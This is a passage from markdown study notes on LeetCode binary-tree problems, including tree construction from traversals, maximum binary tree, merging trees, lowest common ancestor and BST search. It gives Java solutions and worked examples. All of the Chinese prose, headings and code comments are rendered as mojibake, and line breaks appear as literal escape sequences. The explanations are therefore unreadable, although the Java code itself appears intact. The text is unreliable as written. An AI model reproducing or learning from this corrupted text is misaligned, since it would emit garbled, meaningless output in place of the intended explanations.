[-1]\n```\n\n------\n**æ„é€ äºŒå‰æ ‘ï¼Œç¬¬ä¸€ä»¶äº‹ä¸€å®šæ˜¯æ‰¾æ ¹èŠ‚ç‚¹ï¼Œç„¶åæƒ³åŠæ³•æ„é€ å·¦å³å­æ ‘**ã€‚\n\n| ![](https://img.jwt1399.top/img/202212011202315.jpeg) | ![](https://img.jwt1399.top/img/202212011202338.jpeg) |\n| ----------------------------------------------------- | ----------------------------------------------------- |\n\nå‰åºéå†ç»“æœç¬¬ä¸€ä¸ªå°±æ˜¯æ ¹èŠ‚ç‚¹çš„å€¼ï¼Œç„¶åå†æ ¹æ®ä¸­åºéå†ç»“æœç¡®å®šå·¦å³å­æ ‘çš„èŠ‚ç‚¹ã€‚\n\n```java\nclass Solution {\n    // å­˜å‚¨ inorder ä¸­å€¼åˆ°ç´¢å¼•çš„æ˜ å°„\n    HashMap<Integer, Integer> valToIndex = new HashMap<>();\n\n    public TreeNode buildTree(int[] preorder, int[] inorder) {\n        for (int i = 0; i < inorder.length; i++) {\n            valToIndex.put(inorder[i], i);\n        }\n        return build(preorder, 0, preorder.length - 1, inorder, 0, inorder.length - 1);\n    }\n\n    /*\n       å®šä¹‰ï¼šå‰åºéå†æ•°ç»„ä¸º preorder[preStart..preEnd]ï¼Œ\n       ä¸­åºéå†æ•°ç»„ä¸º inorder[inStart..inEnd]ï¼Œ\n       æ„é€ è¿™ä¸ªäºŒå‰æ ‘å¹¶è¿”å›è¯¥äºŒå‰æ ‘çš„æ ¹èŠ‚ç‚¹\n    */\n    TreeNode build(int[] preorder, int preStart, int preEnd,\n                   int[] inorder, int inStart, int inEnd) {\n        if (preStart > preEnd) {\n            return null;\n        }\n\n        // root èŠ‚ç‚¹å¯¹åº”çš„å€¼å°±æ˜¯å‰åºéå†æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ \n        int rootVal = preorder[preStart];\n        // rootVal åœ¨ä¸­åºéå†æ•°ç»„ä¸­çš„ç´¢å¼•\n        int index = valToIndex.get(rootVal);\n        // å·¦å­æ ‘çš„èŠ‚ç‚¹ä¸ªæ•°\n        int leftSize = index - inStart;\n\n        // å…ˆæ„é€ å‡ºå½“å‰æ ¹èŠ‚ç‚¹\n        TreeNode root = new TreeNode(rootVal);\n\n        // é€’å½’æ„é€ å·¦å³å­æ ‘\n        root.left = build(preorder, preStart + 1, preStart + leftSize,\n                inorder, inStart, index - 1);\n\n        root.right = build(preorder, preStart + leftSize + 1, preEnd,\n                inorder, index + 1, inEnd);\n        return root;\n    }\n}\n```\n\n#### [889. æ ¹æ®å‰åºå’Œååºéå†æ„é€ äºŒå‰æ ‘](https://leetcode.cn/problems/construct-binary-tree-from-preorder-and-postorder-traversal/)\n\nç»™å®šä¸¤ä¸ªæ•´æ•°æ•°ç»„ï¼Œ`preorder` å’Œ `postorder` ï¼Œå…¶ä¸­ `preorder` æ˜¯ä¸€ä¸ªå…·æœ‰ **æ— é‡å¤** å€¼çš„äºŒå‰æ ‘çš„å‰åºéå†ï¼Œ`postorder` æ˜¯åŒä¸€æ£µæ ‘çš„ååºéå†ï¼Œé‡æ„å¹¶è¿”å›äºŒå‰æ ‘ã€‚\n\nå¦‚æœå­˜åœ¨å¤šä¸ªç­”æ¡ˆï¼Œæ‚¨å¯ä»¥è¿”å›å…¶ä¸­ **ä»»ä½•** ä¸€ä¸ªã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n![](https://assets.leetcode.com/uploads/2021/07/24/lc-prepost.jpg)\n\n```properties\nè¾“å…¥ï¼špreorder = [1,2,4,5,3,6,7], postorder = [4,5,2,6,7,3,1]\nè¾“å‡ºï¼š[1,2,3,4,5,6,7]\n```\n\n**ç¤ºä¾‹ 2:**\n\n```properties\nè¾“å…¥: preorder = [1], postorder = [1]\nè¾“å‡º: [1]\n```\n\n------\n\n`å‰åºéå†å’Œååºéå†æ˜¯æ²¡åŠæ³•å”¯ä¸€ç¡®å®šä¸€ä¸ªäºŒå‰æ ‘`\n\n**1ã€é¦–å…ˆæŠŠå‰åºéå†ç»“æœçš„ç¬¬ä¸€ä¸ªå…ƒç´ æˆ–è€…ååºéå†ç»“æœçš„æœ€åä¸€ä¸ªå…ƒç´ ç¡®å®šä¸ºæ ¹èŠ‚ç‚¹çš„å€¼**ã€‚\n\n**2ã€ç„¶åæŠŠå‰åºéå†ç»“æœçš„ç¬¬äºŒä¸ªå…ƒç´ ä½œä¸ºå·¦å­æ ‘çš„æ ¹èŠ‚ç‚¹çš„å€¼**ã€‚\n\n**3ã€åœ¨ååºéå†ç»“æœä¸­å¯»æ‰¾å·¦å­æ ‘æ ¹èŠ‚ç‚¹çš„å€¼ï¼Œä»è€Œç¡®å®šäº†å·¦å­æ ‘çš„ç´¢å¼•è¾¹ç•Œï¼Œè¿›è€Œç¡®å®šå³å­æ ‘çš„ç´¢å¼•è¾¹ç•Œï¼Œé€’å½’æ„é€ å·¦å³å­æ ‘å³å¯**ã€‚\n\n![](https://img.jwt1399.top/img/202212011500895.jpeg)\n\n```java\nclass Solution {\n    // å­˜å‚¨ postorder ä¸­å€¼åˆ°ç´¢å¼•çš„æ˜ å°„\n    HashMap<Integer, Integer> valToIndex = new HashMap<>();\n    public TreeNode constructFromPrePost(int[] preorder, int[] postorder) {\n        for (int i = 0; i < postorder.length; i++) {\n            valToIndex.put(postorder[i], i);\n        }\n        return build(preorder, 0, preorder.length - 1, postorder, 0, postorder.length - 1);\n    }\n\n     // å®šä¹‰ï¼šæ ¹æ® preorder[preStart..preEnd] å’Œ postorder[postStart..postEnd]\n    // æ„å»ºäºŒå‰æ ‘ï¼Œå¹¶è¿”å›æ ¹èŠ‚ç‚¹ã€‚\n    TreeNode build(int[] preorder, int preStart, int preEnd, int[] postorder, int postStart, int postEnd) {\n        if (preStart > preEnd) {\n            return null;\n        }\n        // å•ä¸ªèŠ‚ç‚¹åˆ¤æ–­\n        // å› ä¸ºè¦ç¡®å®šå·¦å­æ ‘çš„æ ¹èŠ‚ç‚¹ï¼Œæ‰€ä»¥éœ€è¦è¿›è¡Œå•ä¸ªèŠ‚ç‚¹çš„åˆ¤æ–­\n        // å¦‚æœåªæœ‰ä¸€ä¸ªèŠ‚ç‚¹ï¼Œåˆ™ä¸å­˜åœ¨å·¦å³å­æ ‘ï¼Œæ›´ä¸å­˜åœ¨å·¦å³å­æ ‘çš„æ ¹èŠ‚ç‚¹äº†\n        if (preStart == preEnd) {\n            return new TreeNode(preorder[preStart]);\n        }\n       \n        // root èŠ‚ç‚¹å¯¹åº”çš„å€¼å°±æ˜¯å‰åºéå†æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ \n        int rootVal = preorder[preStart];\n        int leftRootVal = preorder[preStart + 1];\n        // leftRootVal åœ¨ä¸­åºéå†æ•°ç»„ä¸­çš„ç´¢å¼•\n        int index = valToIndex.get(leftRootVal);\n        // å·¦å­æ ‘çš„èŠ‚ç‚¹ä¸ªæ•°\n        int leftSize = index - postStart + 1;\n\n        // å…ˆæ„é€ å‡ºå½“å‰æ ¹èŠ‚ç‚¹\n        TreeNode root = new TreeNode(rootVal);\n\n        // é€’å½’æ„é€ å·¦å³å­æ ‘\n        root.left = build(preorder, preStart + 1, preStart + leftSize,\n                postorder, postStart, index);\n        root.right = build(preorder, preStart + leftSize + 1, preEnd,\n                postorder, index + 1, postEnd - 1);\n        return root;\n    }\n}\n```\n\n#### [654. æœ€å¤§äºŒå‰æ ‘](https://leetcode.cn/problems/maximum-binary-tree/)\n\nç»™å®šä¸€ä¸ªä¸é‡å¤çš„æ•´æ•°æ•°ç»„ `nums` ã€‚ **æœ€å¤§äºŒå‰æ ‘** å¯ä»¥ç”¨ä¸‹é¢çš„ç®—æ³•ä» `nums` é€’å½’åœ°æ„å»º:\n\n1. åˆ›å»ºä¸€ä¸ªæ ¹èŠ‚ç‚¹ï¼Œå…¶å€¼ä¸º `nums` ä¸­çš„æœ€å¤§å€¼ã€‚\n2. é€’å½’åœ°åœ¨æœ€å¤§å€¼ **å·¦è¾¹** çš„ **å­æ•°ç»„å‰ç¼€ä¸Š** æ„å»ºå·¦å­æ ‘ã€‚\n3. é€’å½’åœ°åœ¨æœ€å¤§å€¼ **å³è¾¹** çš„ **å­æ•°ç»„åç¼€ä¸Š** æ„å»ºå³å­æ ‘ã€‚\n\nè¿”å› *`nums` æ„å»ºçš„* **æœ€å¤§äºŒå‰æ ‘** ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n![](https://assets.leetcode.com/uploads/2020/12/24/tree1.jpg)\n\n```properties\nè¾“å…¥ï¼šnums = [3,2,1,6,0,5]\nè¾“å‡ºï¼š[6,3,5,null,2,0,null,null,1]\nè§£é‡Šï¼šé€’å½’è°ƒç”¨å¦‚ä¸‹æ‰€ç¤ºï¼š\n- [3,2,1,6,0,5] ä¸­çš„æœ€å¤§å€¼æ˜¯ 6 ï¼Œå·¦è¾¹éƒ¨åˆ†æ˜¯ [3,2,1] ï¼Œå³è¾¹éƒ¨åˆ†æ˜¯ [0,5] ã€‚\n    - [3,2,1] ä¸­çš„æœ€å¤§å€¼æ˜¯ 3 ï¼Œå·¦è¾¹éƒ¨åˆ†æ˜¯ [] ï¼Œå³è¾¹éƒ¨åˆ†æ˜¯ [2,1] ã€‚\n        - ç©ºæ•°ç»„ï¼Œæ— å­èŠ‚ç‚¹ã€‚\n        - [2,1] ä¸­çš„æœ€å¤§å€¼æ˜¯ 2 ï¼Œå·¦è¾¹éƒ¨åˆ†æ˜¯ [] ï¼Œå³è¾¹éƒ¨åˆ†æ˜¯ [1] ã€‚\n            - ç©ºæ•°ç»„ï¼Œæ— å­èŠ‚ç‚¹ã€‚\n            - åªæœ‰ä¸€ä¸ªå…ƒç´ ï¼Œæ‰€ä»¥å­èŠ‚ç‚¹æ˜¯ä¸€ä¸ªå€¼ä¸º 1 çš„èŠ‚ç‚¹ã€‚\n    - [0,5] ä¸­çš„æœ€å¤§å€¼æ˜¯ 5 ï¼Œå·¦è¾¹éƒ¨åˆ†æ˜¯ [0] ï¼Œå³è¾¹éƒ¨åˆ†æ˜¯ [] ã€‚\n        - åªæœ‰ä¸€ä¸ªå…ƒç´ ï¼Œæ‰€ä»¥å­èŠ‚ç‚¹æ˜¯ä¸€ä¸ªå€¼ä¸º 0 çš„èŠ‚ç‚¹ã€‚\n        - ç©ºæ•°ç»„ï¼Œæ— å­èŠ‚ç‚¹ã€‚\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n![](https://assets.leetcode.com/uploads/2020/12/24/tree2.jpg)\n\n```properties\nè¾“å…¥ï¼šnums = [3,2,1]\nè¾“å‡ºï¼š[3,null,2,null,1]\n```\n##### 1.é€’å½’\n\n```java\n//æ—¶é—´å¤æ‚åº¦ï¼šO(n^2)\n//ç©ºé—´å¤æ‚åº¦ï¼šO(n)\nclass Solution {\n    public TreeNode constructMaximumBinaryTree(int[] nums) {\n        return build(nums, 0, nums.length - 1);\n    }\n    TreeNode build(int[] nums, int start, int end){\n        if(start > end){\n            return null;\n        }\n        // æ‰¾åˆ°æ•°ç»„ä¸­çš„æœ€å¤§å€¼å’Œå¯¹åº”çš„ç´¢å¼•\n        int maxVal = Integer.MIN_VALUE;\n        int maxIndex = -1;\n        for(int i = start; i <= end; i++){\n            if(nums[i] > maxVal){\n                maxVal = nums[i];\n                maxIndex = i;\n            }\n        }\n        TreeNode root = new TreeNode(maxVal);\n        // é€’å½’è°ƒç”¨æ„é€ å·¦å³å­æ ‘\n        root.left = build(nums, start, maxIndex - 1);\n        root.right = build(nums, maxIndex + 1, end);\n        return root;\n    }\n}\n```\n\n##### 2.å•è°ƒæ ˆ(é€’å‡)\n\n```java\nclass Solution {\n    public TreeNode constructMaximumBinaryTree(int[] nums) {\n        Deque<TreeNode> stack = new ArrayDeque();\n        for (int i = 0; i < nums.length; i++) {\n            TreeNode node = new TreeNode(nums[i]);\n            while(!stack.isEmpty()) {\n                TreeNode topNode = stack.peek();\n                //å¦‚æœæ ˆé¡¶å…ƒç´ å¤§äºå¾…æ’å…¥çš„å…ƒç´ ï¼Œé‚£ä¹ˆç›´æ¥å…¥æ ˆ\n                //æ­¤æ—¶ æ ˆé¡¶å…ƒç´ .right = å¾…æ’å…¥å…ƒç´ \n                if (topNode.val > node.val) {\n                    stack.push(node);\n                    topNode.right = node;\n                    break;\n                //å¦‚æœæ ˆé¡¶å…ƒç´ å°äºå¾…æ’å…¥çš„å…ƒç´ ï¼Œé‚£ä¹ˆæ ˆé¡¶å…ƒç´ å‡ºæ ˆã€‚\n                //æ­¤æ—¶ å¾…æ’å…¥å…ƒç´ .left = æ ˆé¡¶å…ƒç´ \n                } else {\n                    stack.pop();\n                    node.left = topNode;\n                }\n            }\n            if (stack.isEmpty()) stack.push(node);\n        }\n        // è¿”å›æ ˆåº•çš„å…ƒç´ ï¼Œä¹Ÿå°±æ˜¯æœ€å¤§å€¼\n        return stack.peekLast();\n    }\n}\n\n\nclass Solution {\n    public TreeNode constructMaximumBinaryTree(int[] nums) {\n        TreeNode[] deque = new TreeNode[1001];\n        int tail = 0;\n        for (int i = 0; i < nums.length; i++) {\n            TreeNode node = new TreeNode(nums[i]);\n            while(tail != 0) {\n                TreeNode topNode = deque[tail - 1];\n                if (topNode.val > node.val) {\n                    deque[tail++] = node;\n                    topNode.right = node;\n                    break;\n                } else {\n                    deque[--tail] = null; // å‡ºæ ˆæ“ä½œ\n                    node.left = topNode;\n                }\n            }\n            if (tail == 0) deque[tail++] = node;\n        }\n        return deque[0];\n    }\n}\n```\n\n#### [998. æœ€å¤§äºŒå‰æ ‘ II](https://leetcode.cn/problems/maximum-binary-tree-ii/)\n\n```java\nclass Solution {\n    public TreeNode insertIntoMaxTree(TreeNode root, int val) {\n        if (root == null) {\n            return new TreeNode(val);\n        }\n        if (root.val < val) {\n            // å¦‚æœ val æ˜¯æ•´æ£µæ ‘æœ€å¤§çš„ï¼Œé‚£ä¹ˆåŸæ¥çš„è¿™æ£µæ ‘åº”è¯¥æ˜¯ val èŠ‚ç‚¹çš„å·¦å­æ ‘ï¼Œ\n            // å› ä¸º val èŠ‚ç‚¹æ˜¯æ¥åœ¨åŸå§‹æ•°ç»„ a çš„æœ€åä¸€ä¸ªå…ƒç´ \n            TreeNode temp = root;\n            root = new TreeNode(val);\n            root.left = temp;\n        } else {\n            // å¦‚æœ val ä¸æ˜¯æœ€å¤§çš„ï¼Œé‚£ä¹ˆå°±åº”è¯¥åœ¨å³å­æ ‘ä¸Šï¼Œ\n            // å› ä¸º val èŠ‚ç‚¹æ˜¯æ¥åœ¨åŸå§‹æ•°ç»„ a çš„æœ€åä¸€ä¸ªå…ƒç´ \n            root.right = insertIntoMaxTree(root.right, val);\n        }\n        return root;\n    }\n}\n\n\nclass Solution {\n    public TreeNode insertIntoMaxTree(TreeNode root, int val) {\n        // å¦‚æœ val æ˜¯æ•´æ£µæ ‘æœ€å¤§çš„ï¼Œé‚£ä¹ˆåŸæ¥çš„è¿™æ£µæ ‘åº”è¯¥æ˜¯ val èŠ‚ç‚¹çš„å·¦å­æ ‘\n        if(root == null || root.val < val){\n            return new TreeNode(val, root, null);\n        }\n        // å¦‚æœ val ä¸æ˜¯æœ€å¤§çš„ï¼Œé‚£ä¹ˆå°±åº”è¯¥åœ¨å³å­æ ‘ä¸Š\n        root.right = insertIntoMaxTree(root.right, val);\n        return root;\n    }\n}\n```\n\n#### [617. åˆå¹¶äºŒå‰æ ‘](https://leetcode.cn/problems/merge-two-binary-trees/)\n\nç»™ä½ ä¸¤æ£µäºŒå‰æ ‘ï¼š `root1` å’Œ `root2` ã€‚\n\næƒ³è±¡ä¸€ä¸‹ï¼Œå½“ä½ å°†å…¶ä¸­ä¸€æ£µè¦†ç›–åˆ°å¦ä¸€æ£µä¹‹ä¸Šæ—¶ï¼Œä¸¤æ£µæ ‘ä¸Šçš„ä¸€äº›èŠ‚ç‚¹å°†ä¼šé‡å ï¼ˆè€Œå¦ä¸€äº›ä¸ä¼šï¼‰ã€‚ä½ éœ€è¦å°†è¿™ä¸¤æ£µæ ‘åˆå¹¶æˆä¸€æ£µæ–°äºŒå‰æ ‘ã€‚åˆå¹¶çš„è§„åˆ™æ˜¯ï¼šå¦‚æœä¸¤ä¸ªèŠ‚ç‚¹é‡å ï¼Œé‚£ä¹ˆå°†è¿™ä¸¤ä¸ªèŠ‚ç‚¹çš„å€¼ç›¸åŠ ä½œä¸ºåˆå¹¶åèŠ‚ç‚¹çš„æ–°å€¼ï¼›å¦åˆ™ï¼Œ**ä¸ä¸º** null çš„èŠ‚ç‚¹å°†ç›´æ¥ä½œä¸ºæ–°äºŒå‰æ ‘çš„èŠ‚ç‚¹ã€‚\n\nè¿”å›åˆå¹¶åçš„äºŒå‰æ ‘ã€‚**æ³¨æ„:** åˆå¹¶è¿‡ç¨‹å¿…é¡»ä»ä¸¤ä¸ªæ ‘çš„æ ¹èŠ‚ç‚¹å¼€å§‹ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n![](https://assets.leetcode.com/uploads/2021/02/05/merge.jpg)\n\n```properties\nè¾“å…¥ï¼šroot1 = [1,3,2,5], root2 = [2,1,3,null,4,null,7]\nè¾“å‡ºï¼š[3,4,5,5,4,null,7]\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```properties\nè¾“å…¥ï¼šroot1 = [1], root2 = [1,2]\nè¾“å‡ºï¼š[2,2] \n```\n\n------\n\n```java\nclass Solution {\n    public TreeNode mergeTrees(TreeNode root1, TreeNode root2) {\n        if(root1 == null){\n            return root2;\n        }\n        if(root2 == null){\n            return root1;\n        }\n        TreeNode root = new TreeNode(root1.val + root2.val);\n        root.left = mergeTrees(root1.left, root2.left);\n        root.right = mergeTrees(root1.right, root2.right);\n        return root;\n    }\n}\n\nclass Solution {\n    public TreeNode mergeTrees(TreeNode root1, TreeNode root2) {\n        // å¦‚æœä¸€æ£µæ ‘æœ‰ï¼Œå¦ä¸€æ£µæ ‘æ²¡æœ‰ï¼Œæ¥ä¸Šå»\n        if (root1 == null) {\n            return root2;\n        }\n        if (root2 == null) {\n            return root1;\n        }\n        // ä¸¤æ£µæ ‘éƒ½æœ‰çš„èŠ‚ç‚¹ï¼Œå åŠ èŠ‚ç‚¹å€¼\n        root1.val += root2.val;\n        // é€’å½’åˆå¹¶å·¦å³å­æ ‘\n        root1.left = mergeTrees(root1.left, root2.left);\n        root1.right = mergeTrees(root1.right, root2.right);\n        return root1;\n    }\n}\n```\n\n### â¼äºŒå‰æ ‘ç¥–å…ˆ\n\n#### [236. äºŒå‰æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆ](https://leetcode.cn/problems/lowest-common-ancestor-of-a-binary-tree/)\n\n> æœ¬é¢˜ä¸[å‰‘æŒ‡ Offer 68 - II. äºŒå‰æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆ ](https://leetcode.cn/problems/er-cha-shu-de-zui-jin-gong-gong-zu-xian-lcof/)ç›¸åŒ\n\nç»™å®šä¸€ä¸ªäºŒå‰æ ‘, æ‰¾åˆ°è¯¥æ ‘ä¸­ä¸¤ä¸ªæŒ‡å®šèŠ‚ç‚¹çš„æœ€è¿‘å…¬å…±ç¥–å…ˆã€‚\n\n[ç™¾åº¦ç™¾ç§‘](https://baike.baidu.com/item/æœ€è¿‘å…¬å…±ç¥–å…ˆ/8918834?fr=aladdin)ä¸­æœ€è¿‘å…¬å…±ç¥–å…ˆçš„å®šä¹‰ä¸ºï¼šâ€œå¯¹äºæœ‰æ ¹æ ‘ T çš„ä¸¤ä¸ªèŠ‚ç‚¹ pã€qï¼Œæœ€è¿‘å…¬å…±ç¥–å…ˆè¡¨ç¤ºä¸ºä¸€ä¸ªèŠ‚ç‚¹ xï¼Œæ»¡è¶³ x æ˜¯ pã€q çš„ç¥–å…ˆä¸” x çš„æ·±åº¦å°½å¯èƒ½å¤§ï¼ˆ**ä¸€ä¸ªèŠ‚ç‚¹ä¹Ÿå¯ä»¥æ˜¯å®ƒè‡ªå·±çš„ç¥–å…ˆ**ï¼‰ã€‚â€\n\n**ç¤ºä¾‹ 1ï¼š**\n\n![](https://assets.leetcode.com/uploads/2018/12/14/binarytree.png)\n\n```properties\nè¾“å…¥ï¼šroot = [3,5,1,6,2,0,8,null,null,7,4], p = 5, q = 1\nè¾“å‡ºï¼š3\nè§£é‡Šï¼šèŠ‚ç‚¹ 5 å’ŒèŠ‚ç‚¹ 1 çš„æœ€è¿‘å…¬å…±ç¥–å…ˆæ˜¯èŠ‚ç‚¹ 3 ã€‚\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n![](https://assets.leetcode.com/uploads/2018/12/14/binarytree.png)\n\n```properties\nè¾“å…¥ï¼šroot = [3,5,1,6,2,0,8,null,null,7,4], p = 5, q = 4\nè¾“å‡ºï¼š5\nè§£é‡Šï¼šèŠ‚ç‚¹ 5 å’ŒèŠ‚ç‚¹ 4 çš„æœ€è¿‘å…¬å…±ç¥–å…ˆæ˜¯èŠ‚ç‚¹ 5 ã€‚å› ä¸ºæ ¹æ®å®šä¹‰æœ€è¿‘å…¬å…±ç¥–å…ˆèŠ‚ç‚¹å¯ä»¥ä¸ºèŠ‚ç‚¹æœ¬èº«ã€‚\n```\n\n**ç¤ºä¾‹ 3ï¼š**\n\n```properties\nè¾“å…¥ï¼šroot = [1,2], p = 1, q = 2\nè¾“å‡ºï¼š1\n```\n\n------\n\n**è§£æï¼š**\n\n1.  **ç»ˆæ­¢æ¡ä»¶ï¼š**\n    1.  å½“è¶Šè¿‡å¶èŠ‚ç‚¹ï¼Œåˆ™ç›´æ¥è¿”å› null ï¼›\n    2.  å½“ root ç­‰äº pæˆ–q ï¼Œåˆ™ç›´æ¥è¿”å› root ï¼›\n2.  **é€’æ¨å·¥ä½œï¼š**\n    1.  å¼€å¯é€’å½’å·¦å­èŠ‚ç‚¹ï¼Œè¿”å›å€¼è®°ä¸º leftï¼›\n    2.  å¼€å¯é€’å½’å³å­èŠ‚ç‚¹ï¼Œè¿”å›å€¼è®°ä¸º right ï¼›\n3.  **è¿”å›å€¼ï¼š** æ ¹æ® left å’Œ right ï¼Œå¯å±•å¼€ä¸ºå››ç§æƒ…å†µï¼›\n    1.  å½“ left å’Œ right **åŒæ—¶ä¸ºç©º** ï¼šè¯´æ˜ root çš„å·¦ / å³å­æ ‘ä¸­éƒ½ä¸åŒ…å« p,q ï¼Œè¿”å› nullï¼›\n    2.  å½“ left å’Œ right **åŒæ—¶ä¸ä¸ºç©º** ï¼šè¯´æ˜ p,q åˆ†åˆ—åœ¨ root çš„ **å¼‚ä¾§** ï¼ˆåˆ†åˆ«åœ¨ å·¦ / å³å­æ ‘ï¼‰ï¼Œå› æ­¤ root ä¸ºæœ€è¿‘å…¬å…±ç¥–å…ˆï¼Œè¿”å› root ï¼›\n    3.  å½“ left **ä¸ºç©º** ï¼Œright **ä¸ä¸ºç©º** ï¼šp,q éƒ½ä¸åœ¨ root çš„å·¦å­æ ‘ä¸­ï¼Œç›´æ¥è¿”å› right ã€‚å…·ä½“å¯åˆ†ä¸ºä¸¤ç§æƒ…å†µï¼š\n        1.  p,q å…¶ä¸­ä¸€ä¸ªåœ¨ root çš„ **å³å­æ ‘** ä¸­ï¼Œæ­¤æ—¶ right æŒ‡å‘ pï¼ˆå‡è®¾ä¸º p ï¼‰ï¼›\n        2.  p,q ä¸¤èŠ‚ç‚¹éƒ½åœ¨ root çš„ **å³å­æ ‘** ä¸­ï¼Œæ­¤æ—¶çš„ right æŒ‡å‘ **æœ€è¿‘å…¬å…±ç¥–å…ˆèŠ‚ç‚¹** ï¼›\n    4.  å½“ left **ä¸ä¸ºç©º** ï¼Œ right **ä¸ºç©º** ï¼šä¸æƒ…å†µ `3.` åŒç†ï¼›\n\n```java\nclass Solution {\n    public TreeNode lowestCommonAncestor(TreeNode root, TreeNode p, TreeNode q) {\n        // base case\n        if (root == null) return null;\n        if (root == p || root == q) return root;\n\n        TreeNode left = lowestCommonAncestor(root.left, p, q);\n        TreeNode right = lowestCommonAncestor(root.right, p, q);\n        // æƒ…å†µ 1\n      \tif (left == null && right == null) {\n            return null;\n        }\n        // æƒ…å†µ 2\n        if (left != null && right != null) {\n            return root;\n        }\n        // æƒ…å†µ 3ï¼Œ4\n        return left == null ? right : left;\n    }\n}\n```\n\n#### [235. äºŒå‰æœç´¢æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆ](https://leetcode.cn/problems/lowest-common-ancestor-of-a-binary-search-tree/)\n\n> æœ¬é¢˜ä¸[å‰‘æŒ‡ Offer 68 - I. äºŒå‰æœç´¢æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆ ](https://leetcode.cn/problems/er-cha-sou-suo-shu-de-zui-jin-gong-gong-zu-xian-lcof/)ç›¸åŒ\n\nç»™å®šä¸€ä¸ªäºŒå‰æœç´¢æ ‘, æ‰¾åˆ°è¯¥æ ‘ä¸­ä¸¤ä¸ªæŒ‡å®šèŠ‚ç‚¹çš„æœ€è¿‘å…¬å…±ç¥–å…ˆã€‚\n\n[ç™¾åº¦ç™¾ç§‘](https://baike.baidu.com/item/æœ€è¿‘å…¬å…±ç¥–å…ˆ/8918834?fr=aladdin)ä¸­æœ€è¿‘å…¬å…±ç¥–å…ˆçš„å®šä¹‰ä¸ºï¼šâ€œå¯¹äºæœ‰æ ¹æ ‘ T çš„ä¸¤ä¸ªç»“ç‚¹ pã€qï¼Œæœ€è¿‘å…¬å…±ç¥–å…ˆè¡¨ç¤ºä¸ºä¸€ä¸ªç»“ç‚¹ xï¼Œæ»¡è¶³ x æ˜¯ pã€q çš„ç¥–å…ˆä¸” x çš„æ·±åº¦å°½å¯èƒ½å¤§ï¼ˆ**ä¸€ä¸ªèŠ‚ç‚¹ä¹Ÿå¯ä»¥æ˜¯å®ƒè‡ªå·±çš„ç¥–å…ˆ**ï¼‰ã€‚â€\n\nä¾‹å¦‚ï¼Œç»™å®šå¦‚ä¸‹äºŒå‰æœç´¢æ ‘: root = [6,2,8,0,4,7,9,null,null,3,5]\n\n![](https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/14/binarysearchtree_improved.png)\n\n \n\n**ç¤ºä¾‹ 1:**\n\n```properties\nè¾“å…¥: root = [6,2,8,0,4,7,9,null,null,3,5], p = 2, q = 8\nè¾“å‡º: 6 \nè§£é‡Š: èŠ‚ç‚¹ 2 å’ŒèŠ‚ç‚¹ 8 çš„æœ€è¿‘å…¬å…±ç¥–å…ˆæ˜¯ 6ã€‚\n```\n\n**ç¤ºä¾‹ 2:**\n\n```properties\nè¾“å…¥: root = [6,2,8,0,4,7,9,null,null,3,5], p = 2, q = 4\nè¾“å‡º: 2\nè§£é‡Š: èŠ‚ç‚¹ 2 å’ŒèŠ‚ç‚¹ 4 çš„æœ€è¿‘å…¬å…±ç¥–å…ˆæ˜¯ 2, å› ä¸ºæ ¹æ®å®šä¹‰æœ€è¿‘å…¬å…±ç¥–å…ˆèŠ‚ç‚¹å¯ä»¥ä¸ºèŠ‚ç‚¹æœ¬èº«ã€‚\n```\n\n------\n\n```java\nclass Solution {\n    public TreeNode lowestCommonAncestor(TreeNode root, TreeNode p, TreeNode q) {\n        if(root == null) return null;\n        // p å’Œ q éƒ½åœ¨ root çš„å·¦å­æ ‘ï¼Œé‚£ä¹ˆ LCA åœ¨å·¦å­æ ‘\n        if (root.val > q.val && root.val > p.val) {\n            return lowestCommonAncestor(root.left, p, q);\n        }\n\n        // p å’Œ q éƒ½åœ¨ root çš„å³å­æ ‘ï¼Œé‚£ä¹ˆ LCA åœ¨å³å­æ ‘\n        if (root.val < q.val && root.val < p.val) {\n            return lowestCommonAncestor(root.right, p, q);\n        }\n\n        // p å’Œ q åˆ†åˆ«åœ¨ root çš„å·¦å³å­æ ‘ï¼Œé‚£ä¹ˆ root å°±æ˜¯ LCA\n        return root;\n    }\n}\n```\n\n### â½äºŒå‰æœç´¢æ ‘\n\n> ä¸­åºéå†ä¼šæœ‰åºéå† BST çš„èŠ‚ç‚¹\n\n#### è§£é¢˜æ¡†æ¶\n\n```java\nvoid BST(TreeNode root, int target) {\n\t\tif (root == null) return;\n    if (root.val == target) {\n      // æ‰¾åˆ°ç›®æ ‡ï¼Œåšç‚¹ä»€ä¹ˆ\n    } \n    // å»å³å­æ ‘æœç´¢\n    if (root.val < target) {\n      BST(root.right, target);\n    }\n    // å»å·¦å­æ ‘æœç´¢ \n    if (root.val > target) {\n      BST(root.left, target);\n    }     \n}\n```\n\n#### [700. äºŒå‰æœç´¢æ ‘ä¸­çš„æœç´¢ ](https://leetcode.cn/problems/search-in-a-binary-search-tree/)\n\nç»™å®šäºŒå‰æœç´¢æ ‘ï¼ˆBSTï¼‰çš„æ ¹èŠ‚ç‚¹ `root` å’Œä¸€ä¸ªæ•´æ•°å€¼ `val`ã€‚\n\nä½ éœ€è¦åœ¨ BST ä¸­æ‰¾åˆ°èŠ‚ç‚¹å€¼ç­‰äº `val` çš„èŠ‚ç‚¹ã€‚ è¿”å›ä»¥è¯¥èŠ‚ç‚¹ä¸ºæ ¹çš„å­æ ‘ã€‚ å¦‚æœèŠ‚ç‚¹ä¸å­˜åœ¨ï¼Œåˆ™è¿”å› `null` ã€‚\n\n**ç¤ºä¾‹ 1:**\n\n![](https://assets.leetcode.com/uploads/2021/01/12/tree1.jpg)\n\n```properties\nè¾“å…¥ï¼šroot = [4,2,7,1,3], val = 2\nè¾“å‡ºï¼š[2,1,3]\n```\n\n**ç¤ºä¾‹ 2:**\n\n![](https://assets.leetcode.com/uploads/2021/01/12/tree2.jpg)\n\n```properties\nè¾“å…¥ï¼šroot = 